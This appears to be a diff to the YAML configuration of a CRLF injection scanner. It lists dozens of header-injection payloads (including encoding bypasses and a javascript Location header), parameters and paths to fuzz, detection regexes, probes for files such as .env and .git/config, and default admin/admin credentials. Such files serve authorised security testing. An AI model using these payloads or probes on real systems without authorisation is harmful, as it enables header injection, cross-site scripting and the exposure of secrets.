@@ -1,97 +1,445 @@
+# CRLF Injection Scanner Configuration
+# Version: 3.0.0
+
 targets:
+  # Direct URLs to scan
   urls:
-    - "https://example.com"
-  domains: []
+    - https://example.com
+    - http://test.example.com
+  
+  # Domains to generate URLs from
+  domains:
+    - target-domain.com
+    - another-target.com
+  
+  # Path wordlist for URL generation
   wordlist: "wordlists/urls.txt"
+  
+  # Spider recursion depth (how deep to crawl)
   recurse_depth: 3
+  
+  # Maximum number of pages to spider
   max_pages: 1000
 
 scanner:
+  # Number of concurrent threads
   threads: 50
+  
+  # Request timeout in seconds
   timeout: 30
+  
+  # Rate limit (requests per second)
   rate_limit: 10
+  
+  # Follow HTTP redirects
   follow_redirects: true
+  
+  # Number of retries for failed requests
   retries: 3
+  
+  # Verify SSL certificates
   verify_ssl: false
+  
+  # User-Agent rotation
   user_agents:
-    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
-    - "curl/7.68.0"
-    - "PostmanRuntime/7.28.4"
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
+    - "curl/7.88.1"
+    - "PostmanRuntime/7.36.0"
+    - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  
+  # HTTP proxy (optional)
   proxy: ""
 
 crlf:
+  # CRLF injection payloads
   payloads:
     - "%0d%0aSet-Cookie:crlf=injected"
     - "%0d%0aLocation:javascript:alert(1)"
     - "%0d%0aX-XSS-Protection:0"
     - "%0d%0aAccess-Control-Allow-Origin:*"
     - "%0d%0aX-Forwarded-Host:attacker.com"
+    - "%0d%0aX-Forwarded-For:127.0.0.1"
+    - "%0d%0aX-Rewrite-URL:/"
+    - "%0dSet-Cookie:crlf=injected"
+    - "%0aSet-Cookie:crlf=injected"
+    - "\r\nSet-Cookie:crlf=injected"
+    - "\rSet-Cookie:crlf=injected"
+    - "\nSet-Cookie:crlf=injected"
+    - "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injected"  # Unicode bypass
+    - "%250d%250aSet-Cookie:crlf=injected"          # Double encoding
+    - "%%0d0aSet-Cookie:crlf=injected"
+    - "%%0d%0aSet-Cookie:crlf=injected"
+    - "%0d%0a%0d%0aSet-Cookie:crlf=injected"
+    - "%0d%0aX-Custom-Header:injected"
+    - "%0d%0aContent-Length:0%0d%0a%0d%0a"
+    - "%0d%0aX-Api-Version:1.0%0d%0aX-Injected:true"
+    - "%0d%0aX-CSRF-Token:injected"
+    - "%0d%0aX-Request-ID:injected"
+    - "%0d%0aX-Trace-ID:injected"
+    - "%0d%0aX-Correlation-ID:injected"
+    - "%0d%0aX-Session-ID:injected"
+    - "%0d%0aX-User-ID:injected"
+    - "%0d%0aX-Admin:true"
+    - "%0d%0aX-Is-Admin:true"
+    - "%0d%0aX-Debug:true"
+  
+  # Headers to test for injection
   test_headers:
     - "User-Agent"
     - "Referer"
     - "X-Forwarded-For"
     - "X-Forwarded-Host"
+    - "X-Original-URL"
+    - "X-Rewrite-URL"
+    - "Origin"
+    - "X-Custom-Header"
+    - "Accept"
+    - "Accept-Language"
+    - "Cache-Control"
+    - "X-Client-IP"
+    - "X-Real-IP"
+    - "X-Originating-IP"
+    - "X-Remote-IP"
+    - "X-Remote-Addr"
+    - "True-Client-IP"
+    - "CF-Connecting-IP"
+    - "X-HTTP-Host-Override"
+    - "X-Forwarded-Server"
+    - "X-Host"
+  
+  # Parameters to test for injection
   test_params:
     - "url"
     - "redirect"
     - "next"
     - "return"
+    - "returnTo"
+    - "return_to"
+    - "r"
+    - "redirect_uri"
+    - "redirect_url"
+    - "redir"
+    - "destination"
+    - "dest"
+    - "path"
+    - "file"
+    - "page"
+    - "feed"
+    - "host"
+    - "data"
+    - "reference"
+    - "site"
+    - "html"
+    - "val"
+    - "validate"
+    - "domain"
+    - "callback"
+    - "jsonp"
+    - "continue"
+    - "target"
+    - "goto"
+    - "link"
+    - "href"
+    - "src"
+    - "image"
+    - "picture"
+    - "video"
+    - "audio"
+    - "download"
+  
+  # Paths to test for injection
   test_paths:
     - "/redirect"
     - "/callback"
     - "/auth/callback"
-  test_methods: ["GET", "POST", "PUT"]
+    - "/oauth/callback"
+    - "/login"
+    - "/logout"
+    - "/register"
+    - "/profile"
+    - "/settings"
+    - "/api"
+    - "/webhook"
+    - "/webhooks"
+    - "/notify"
+    - "/notification"
+    - "/authorize"
+    - "/token"
+    - "/refresh"
+    - "/verify"
+    - "/confirm"
+    - "/reset-password"
+    - "/forgot-password"
+    - "/change-password"
+    - "/checkout"
+    - "/payment"
+    - "/payment/callback"
+    - "/subscribe"
+    - "/unsubscribe"
+  
+  # HTTP methods to test
+  test_methods:
+    - "GET"
+    - "POST"
+    - "PUT"
+    - "DELETE"
+    - "PATCH"
+    - "HEAD"
+    - "OPTIONS"
+  
+  # Injection points to test
+  injection_points:
+    - "header"
+    - "parameter"
+    - "path"
+    - "fragment"
+    - "body"
+  
+  # Patterns to detect successful injection
+  detection_patterns:
+    - "(?i)set-cookie:\\s*crlf=injected"
+    - "(?i)location:\\s*"
+    - "(?i)x-custom-header:\\s*injected"
+    - "(?i)x-injected:\\s*true"
+    - "crlf=injected"
+    - "injected=true"
+    - "(?i)x-api-version:\\s*1\\.0"
+    - "(?i)x-csrf-token:\\s*injected"
+    - "(?i)x-admin:\\s*true"
+    - "(?i)x-debug:\\s*true"
+  
+  # Bypass techniques to try
+  bypass_techniques:
+    - "unicode"
+    - "double_encode"
+    - "overlong_utf8"
+    - "html_entities"
+    - "url_encode"
+    - "multiple_encodings"
 
 spider:
+  # Enable/disable spider functionality
   enabled: true
+  
+  # Extract URLs from pages
   extract_urls: true
+  
+  # Extract forms from pages
   extract_forms: true
+  
+  # Extract JavaScript files and endpoints
   extract_js: true
+  
+  # Extract HTML/JavaScript comments
   extract_comments: true
+  
+  # Check robots.txt
   robots_txt: true
+  
+  # Check sitemap.xml
   sitemap_xml: true
+  
+  # Common files to check
   common_files:
     - "robots.txt"
     - "sitemap.xml"
+    - "sitemap_index.xml"
     - "crossdomain.xml"
+    - "clientaccesspolicy.xml"
+    - "humans.txt"
+    - "security.txt"
+    - ".well-known/security.txt"
+    - "phpinfo.php"
+    - "test.php"
+    - "info.php"
+    - "admin.php"
+    - "wp-admin.php"
+    - "config.php"
+    - "settings.php"
+    - "debug.php"
+    - "readme.html"
+    - "license.txt"
+    - "changelog.txt"
+    - ".git/config"
+    - ".env"
+    - "config.json"
+    - "config.yaml"
+    - "config.yml"
+  
+  # Common directories to check
   common_dirs:
     - "admin"
-    - "api"
+    - "administrator"
+    - "wp-admin"
+    - "login"
+    - "signin"
     - "auth"
+    - "api"
+    - "v1"
+    - "v2"
+    - "api/v1"
+    - "api/v2"
+    - "rest"
+    - "graphql"
+    - "swagger"
+    - "docs"
+    - "documentation"
+    - "test"
+    - "dev"
+    - "staging"
+    - "backup"
+    - "backups"
+    - "tmp"
+    - "temp"
+    - "cache"
+    - "logs"
+    - "config"
+    - "configuration"
+    - "setup"
+    - "install"
+    - "dashboard"
+    - "console"
+    - "control"
+    - "manage"
+    - "manager"
+    - "system"
+    - "adminer"
+    - "phpmyadmin"
+  
+  # File extensions to look for
   file_extensions:
     - ".php"
+    - ".asp"
+    - ".aspx"
+    - ".jsp"
+    - ".do"
+    - ".action"
     - ".html"
+    - ".htm"
     - ".js"
+    - ".css"
     - ".json"
+    - ".xml"
+    - ".txt"
+    - ".pdf"
+    - ".doc"
+    - ".docx"
+    - ".xls"
+    - ".xlsx"
+    - ".zip"
+    - ".rar"
+    - ".tar"
+    - ".gz"
+    - ".sql"
+    - ".bak"
+    - ".old"
+    - ".backup"
+    - ".swp"
+    - ".swo"
 
 auth:
+  # Enable/disable authentication
   enabled: false
-  methods: ["basic", "bearer"]
+  
+  # Authentication methods to try
+  methods:
+    - "basic"
+    - "bearer"
+    - "cookie"
+    - "form"
+    - "oauth"
+  
+  # Default credentials
   credentials:
     username: "admin"
     password: "admin"
+    email: "admin@example.com"
+    token: "test-token-123"
+  
+  # Authentication headers
   headers:
     Authorization: "Bearer"
-  tokens: []
+    X-API-Key: ""
+    X-Auth-Token: ""
+  
+  # Authentication tokens to try
+  tokens:
+    - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+    - "test-jwt-token-123"
+    - "admin-token-456"
+  
+  # Enable session management
   session_management: true
 
 headers:
+  # Custom headers to send with requests
   custom:
     X-Requested-With: "XMLHttpRequest"
     Accept: "application/json, text/plain, */*"
+    Accept-Language: "en-US,en;q=0.9"
+    Accept-Encoding: "gzip, deflate, br"
+    Connection: "keep-alive"
+    Cache-Control: "no-cache"
+    Pragma: "no-cache"
+  
+  # Headers to fuzz with payloads
   fuzz_headers:
     - "X-Forwarded-For"
     - "X-Forwarded-Host"
     - "X-Original-URL"
+    - "X-Rewrite-URL"
+    - "X-Custom-IP-Authorization"
+    - "X-Originating-IP"
+    - "X-Remote-IP"
+    - "X-Remote-Addr"
+    - "X-Client-IP"
+    - "X-Host"
+    - "X-Forwarded-Server"
+    - "X-HTTP-Host-Override"
+    - "Forwarded"
+    - "Via"
+    - "True-Client-IP"
+    - "CF-Connecting-IP"
+    - "X-Correlation-ID"
+    - "X-Request-ID"
+    - "X-Trace-ID"
+    - "X-Session-ID"
+  
+  # Security headers to check for
   security_headers:
     - "Content-Security-Policy"
     - "X-Frame-Options"
+    - "X-Content-Type-Options"
+    - "X-XSS-Protection"
+    - "Strict-Transport-Security"
+    - "Referrer-Policy"
+    - "Feature-Policy"
+    - "Permissions-Policy"
+    - "X-Permitted-Cross-Domain-Policies"
+    - "Expect-CT"
+    - "Clear-Site-Data"
+  
+  # Add random headers to requests
   add_random_headers: true
 
 output:
+  # Output directory for reports
   directory: "results"
-  formats: ["json", "html", "md", "csv"]
+  
+  # Output formats
+  formats:
+    - "json"
+    - "html"
+    - "md"
+    - "csv"
+  
+  # Enable verbose output
   verbose: false
+  
+  # Save HTTP responses for analysis
   save_responses: true
+  
+  # Color output in terminal
   color: true
